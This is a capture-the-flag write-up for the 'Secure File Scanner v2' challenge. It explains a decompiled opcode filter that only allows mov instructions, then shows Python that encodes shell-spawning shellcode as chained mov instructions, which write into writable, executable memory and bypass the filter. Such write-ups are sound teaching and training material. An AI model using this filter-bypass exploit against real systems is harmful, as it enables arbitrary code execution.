# Writeup: Secure File Scanner v2

This challenge is a continuation of the previous one, but with a new vulnerability.

## Step 1: Analyzing the Binary

Analyzing with a decompiler you can figure out how the opcodes are filtered, the
original version of the filter function is the following:

```c
unsigned char sanitize_driver(unsigned char *driver, unsigned short len) {
  for (unsigned short i = 0; i < len;) {
    unsigned char modifier = NOSHIFT;

    // arg modifier *2
    if ((driver[i] & 0b11111000) == 0x48) {
      modifier = SHL;
      i++;
    }

    // arg modifier /2
    if (driver[i] == 0x66 || driver[i] == 0x67) {
      modifier = SHR;
      i++;
    }

    // MOV r - imm
    if ((driver[i] & 0b11111000) == 0xb0) { // 8 bit reg
      i += op_argsize(1, modifier) + 1;
      goto endloop;
    }
    if ((driver[i] & 0b11111000) == 0xb8) { // 32 bit reg
      i += op_argsize(4, modifier) + 1;
      goto endloop;
    }

    // MOV r/m - imm
    if (driver[i] == 0xc6 || driver[i] == 0xc7) {
      i += 1 + 1 + 4;
      goto endloop;
    }

    // MOV r - r/m
    if ((driver[i] & 0b11111100) == 0x88) {
      i++;

      switch (driver[i] >> 6) {
      case 0: // no displacement
        if ((driver[i] & 0b00000111) == 0b00000101)
          i += 4;
        break;
      case 1: // displacement 8bit
        i += 1;
        break;
      case 2: // displacement 32bit
        i += 4;
        break;
      case 3: // no displacement
        break;
      }
      i++;
      goto endloop;
    }

    return 1;

  endloop:
    if (i > len)
      return 1;
  }

  driver[len] = '\xc3'; // ret call
  return 0;
}
```

You can see from reading the [Instruction reference](http://ref.x86asm.net/coder64.html)
(or by reading the comments) that only `mov` instructions are accepted.

## Step 2: Shell script

Since the memory on which the driver is written is RWX, you can dynamically modify
the bytecode sent to the challenge when you use the driver. To do this you need:

- a `mov` that saves the n-th part of you shellscript to a register (let's say `rax`);
- another `mov` that writes the content of `rax` after all the moves.

In this way after the movs are executed, instead of returning directly, the program
executes the arbitrary code written with the previous `mov` instructions:

```python
def generate_scanner_instructions() -> bytes:
    MOVABS_LEN = 10
    MOVQ_LEN = 7

    shellcode = asm(shellcraft.sh())
    len_shellcode = len(shellcode)
    mov_needed = len_shellcode // 8
    movs = []

    for i in range(mov_needed):
        movs.append(f"mov rax, 0x{shellcode[i * 8 : i * 8 + 8][::-1].hex()}")
        movs.append(
            f"mov [rip+{(mov_needed - 1 - i) * (MOVABS_LEN + MOVQ_LEN) + i * 8}], rax"
        )
    return asm("\n".join(movs))
```
